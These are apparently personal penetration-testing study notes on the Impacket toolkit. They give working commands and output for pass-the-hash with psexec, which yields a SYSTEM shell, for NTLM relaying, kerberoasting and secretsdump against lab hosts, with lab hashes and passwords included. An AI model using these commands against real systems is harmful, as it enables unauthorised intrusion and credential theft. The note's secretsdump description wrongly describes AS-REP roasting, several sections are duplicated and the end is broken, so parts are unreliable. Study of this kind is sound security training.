
# Python Impacket
Init.

Python [impacket](https://github.com/fortra/impacket/tree/master) is an open-source collection of scripts designed to interact with common [networking](/networking/OSI/network-layer.md) protocols. Many of the scripts can be used in pen-testing, especially against Windows targets.
## Use
### `impacket-scripts` Package
[`impacket-scripts`](https://www.kali.org/tools/impacket-scripts/)  is a [python](../../../../coding/languages/python/python.md) package which will allow you to access all of impacket's scripts with this commons syntax: `impacket-<script name>`:
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
FILES02

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

C:\Windows\system32> whoami
nt authority\system
```
## Common Scripts
(I'm keeping a list here for my own use/ reference). 
### [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
![See my OSCP notes on using `psexec.py` to pass the hash](../../../../OSCP/password-attacks/passing-NTLM.md#Using%20`psexec.py`)
### `wmiexec.py`
![See my OSCP notes on using `wmiexec.py` to pass the hash](../../../../OSCP/password-attacks/passing-NTLM.md#Using%20`wmiexec.py`)

### [`smbrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/smbrelayx.py)
### [`ntlmrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```
- `tf`: target file
- `-smb2support`: support SMB version 2
- `-c`: command to execute on target system
- `-i`: interactive (will give you a shell)
### [`GetNPUsers.py`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
Get's TGTs for users in an [active-directory](../../../hidden/HTB-notes/active-directory.md) environment who have *[kerberos](../../../networking/protocols/kerberos.md) pre-authentication turned off.* This is useful to know because having pre-auth turned off means we can ask for their TGTs without supplying a password. 

Once you have a TGT you can crack it with something like [john](../cracking/john.md).
#### Example
```bash
python3 GetNPUsers.py 
```
### [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
```bash
impacket-GetUserSPNs -usersfile [users.lst](https://users.lst) -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -no-pass
```
### [`secretdump.py`](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
Will attempt to dump hashes from a remote machine *without executing an agent there*. Gets [kerberos](../../../../networking/protocols/kerberos.md) TGTs from users which have the *`UF_DONT_REQUIRE_PREAUTH`* (which means they have pre-authentication turned off). 

From these types of users we can get their *AS_REP* which is *partially encrypted using their password*. 

Once we have the AS-REP, we can give it to [hashcat](../../cracking/tools/hashcat.md) for cracking (and getting the plaintext password).
### [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
```bash
impacket-GetUserSPNs -usersfile users.lst -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -no-pass
```
### [`secretdump.py`](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
```bash
secretsdump.py 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
````
- The domain, user, password, and IP should be surround in quotes
### `mssqlclient.py`
[`mssqlclient.py`](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) can be used to connect to a remote [MSSQL](../../../../CLI-tools/windows/MSSQL.md) server (on a Windows target).
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Administrator  dbo@master)>
```
- `-windows-auth` will authenticate you if you supply a username and password *and force [NTLM](../../../../networking/protocols/NTLM.md) authentication*.

> [!Resources]
> - [Impacket GitHub](https://github.com/fortra/impacket/tree/master)
. - [`impacket-scripts`](https://www.kali.org/tools/impacket-scripts/) p